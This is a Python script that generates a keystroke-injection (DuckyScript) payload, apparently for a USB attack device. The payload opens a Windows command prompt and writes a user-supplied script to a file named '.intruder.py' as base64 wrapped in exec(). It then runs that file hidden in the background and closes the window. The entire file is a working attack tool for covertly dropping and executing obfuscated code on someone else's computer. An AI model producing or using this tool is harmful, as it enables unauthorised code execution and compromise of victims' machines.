import sys
import os
import base64


client_side_file = ".intruder.py"

# prepare
print("DELAY 700")
print("GUI r")
print("STRING cmd")
print("ENTER")
print("DELAY 300")

print("STRING del "+client_side_file)
print("ENTER")

print("STRING echo import base64 > "+client_side_file)
print("ENTER")
print("STRING echo exec(base64.b64decode(\"", end="")

# start file encode

raw_string = ""

for i in range(1, len(sys.argv)):
    file_name = sys.argv[i]
    try:
        file = open(file_name, "r") 
    except:
        print("Could not open file: "+file_name)
        os._exit(1)
    
    if i == 1:
    
        for line in file:
            if not line.strip() or line.strip()[0] == "#":
                continue
            else:
                raw_string+=line
file.close()

encoded = base64.b64encode(raw_string.encode("ascii"))
print(encoded.decode("ascii") + "\").decode(\"ascii\")) >> "+client_side_file)
print("ENTER")

# start execute
print("STRING start /b python %cd%\\"+client_side_file)
print("ENTER")
print("STRING exit")
print("ENTER")

